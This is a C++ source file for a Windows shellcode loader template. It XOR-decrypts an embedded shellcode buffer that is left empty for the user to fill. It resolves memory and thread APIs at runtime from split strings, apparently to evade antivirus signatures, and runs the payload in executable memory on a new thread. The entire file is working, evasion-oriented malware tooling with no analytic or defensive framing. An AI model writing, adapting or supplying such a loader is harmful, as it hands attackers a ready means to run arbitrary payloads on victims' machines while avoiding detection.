#include <iostream>
#include <windows.h>

// XOR decryption function
void transform_buffer(unsigned char* buffer, size_t buffer_size, const char* salt) {
	size_t salt_size = 0;
	const char* temp = salt;
	while (*temp++) salt_size++;
	
	size_t end = buffer_size;
	while (end > 0) {
		end--;
		buffer[end] ^= salt[end % salt_size];
	}
}

// ::::: Input your shellcode bytes here ::::::
unsigned char shellcode[] = "";
// ::::: Input your shellcode bytes here ::::::


int main() {
	// Decrypt shellcode
	const char* key = "mick3y";
	transform_buffer(shellcode, sizeof(shellcode), key);
	
	// Get kernel32.dll handle
	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
	if (!hKernel32) {
		std::cout << "Failed to get kernel32.dll handle" << std::endl;
		return 0;
	}
	
	// Dynamically resolve VirtualAlloc
	std::string first_char = "Virtual";
	std::string second_char = "Alloc";
	std::string all_char = first_char + second_char;
	FARPROC pVirtualAllocRaw = GetProcAddress(hKernel32, all_char.c_str());
	if (!pVirtualAllocRaw) {
		std::cout << "Failed to get VirtualAlloc function address" << std::endl;
		return 0;
	}
	typedef LPVOID(WINAPI* pVirtualAlloc)(
        LPVOID lpAddress, 
        SIZE_T dwSize, 
        DWORD flAllocationType, 
        DWORD flProtect
    );
	pVirtualAlloc VirtualAlloc_fn = (pVirtualAlloc)pVirtualAllocRaw;
	
	// Allocate executable memory
	LPVOID shellcodeRaw = VirtualAlloc_fn(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!shellcodeRaw) {
		std::cout << "Memory allocation failed" << std::endl;
		return 0;
	}
	
	// Dynamically resolve RtlMoveMemory
	first_char = "Rtl";
	second_char = "MoveMemory";
	all_char = first_char + second_char;
	FARPROC pRtlMoveMemoryRaw = GetProcAddress(hKernel32, all_char.c_str());
	if (!pRtlMoveMemoryRaw) {
		std::cout << "Failed to get RtlMoveMemory function address" << std::endl;
		return 0;
	}
	typedef VOID(WINAPI* rRtlMoveMemory)(
        VOID UNALIGNED* Destination, 
        const VOID UNALIGNED* Source, 
        SIZE_T Length
    );
	rRtlMoveMemory RtlMoveMemory_fn = (rRtlMoveMemory)pRtlMoveMemoryRaw;
	
	// Copy shellcode to allocated memory
	RtlMoveMemory_fn(shellcodeRaw, shellcode, sizeof(shellcode));
	
	// Dynamically resolve VirtualProtect
	DWORD oldprotect = 0;
	first_char = "Virtual";
	second_char = "Protect";
	all_char = first_char + second_char;
	FARPROC pVirtualProtectRaw = GetProcAddress(hKernel32, all_char.c_str());
	if (!pVirtualProtectRaw) {
		std::cout << "Failed to get VirtualProtect function address" << std::endl;
		return 0;
	}
	typedef BOOL(WINAPI* rVirtualProtect)(
        LPVOID lpAddress, 
        SIZE_T dwSize, 
        DWORD flNewProtect, 
        PDWORD lpflOldProtect
    );
	rVirtualProtect VirtualProtect_fn = (rVirtualProtect)pVirtualProtectRaw;
	
	// Change memory protection to execute-only
	VirtualProtect_fn(shellcodeRaw, sizeof(shellcode), PAGE_EXECUTE_READ, &oldprotect);
	
	// Dynamically resolve CreateThread
	first_char = "Create";
	second_char = "Thread";
	all_char = first_char + second_char;
	FARPROC pCreateThread = GetProcAddress(hKernel32, all_char.c_str());
	if (!pCreateThread) {
		std::cout << "Failed to get CreateThread function address" << std::endl;
		return 0;
	}
	typedef HANDLE(WINAPI* rCreateThread)(
        LPSECURITY_ATTRIBUTES lpThreadAttributes, 
        SIZE_T dwStackSize, 
        LPTHREAD_START_ROUTINE lpStartAddress, 
        __drv_aliasesMem LPVOID lpParameter, 
        DWORD dwCreationFlags, 
        LPDWORD lpThreadId
    );
	rCreateThread CreateThread_fn = (rCreateThread)pCreateThread;
	
	// Execute shellcode in new thread
	HANDLE hThread = CreateThread_fn(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeRaw, NULL, 0, NULL);
	if (!hThread) {
		std::cout << "Thread creation failed" << std::endl;
		return 0;
	}
	
	// Wait for execution to complete
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	
	return 0;
}